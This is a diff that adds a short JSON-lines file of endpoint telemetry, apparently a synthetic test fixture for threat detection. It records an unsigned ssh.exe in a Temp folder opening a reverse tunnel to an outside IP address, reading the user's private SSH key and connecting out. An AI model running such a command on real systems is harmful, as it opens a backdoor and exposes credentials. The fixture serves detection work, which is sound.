@@ -1,0 +1,4 @@
+{"ts": 1759999400000, "pid": 4000, "guid": "explorer", "type": "process_start", "ppid": 0, "image": "C:\\Windows\\explorer.exe", "cmdline": "C:\\Windows\\Explorer.EXE", "user": "LAWBYTE\\azka", "integrity": "medium", "signed": "valid", "signer": "Microsoft Windows"}
+{"ts": 1760000000000, "pid": 34000, "guid": "ssh-copy", "type": "process_start", "ppid": 4000, "image": "C:\\Users\\azka\\AppData\\Local\\Temp\\ssh.exe", "cmdline": "ssh.exe -N -R 9000:localhost:22 root@185.220.101.7", "user": "LAWBYTE\\azka", "integrity": "medium", "signed": "unsigned", "parent_guid": "explorer", "sha256": "5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e"}
+{"ts": 1760000000200, "pid": 34000, "guid": "ssh-copy", "type": "file_access", "path": "C:\\Users\\azka\\.ssh\\id_rsa", "op": "read"}
+{"ts": 1760000000700, "pid": 34000, "guid": "ssh-copy", "type": "net_connect", "proto": "tcp", "dst_ip": "185.220.101.7", "dst_port": 22, "src_port": 50123}
